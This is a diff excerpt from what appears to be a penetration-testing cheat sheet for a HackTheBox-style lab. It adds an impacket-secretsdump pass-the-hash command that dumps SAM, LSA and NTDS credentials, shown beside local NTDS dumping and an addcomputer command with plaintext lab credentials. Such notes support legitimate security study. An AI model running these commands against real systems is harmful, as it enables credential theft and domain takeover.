@@ -4030,6 +4030,9 @@ c:\users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-133735
 # command to dump use 3 file 
 impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
 
+# Use secretsdump to remotely dump SAM/LSA/NTDS
+impacket-secretsdump -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+
 # add new computer HACKER-PC
 impacket-addcomputer 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -method LDAPS -computer-name HACKER-PC -computer-pass 0xdf0xdf0xdf -dc-ip 10.10.11.222
 
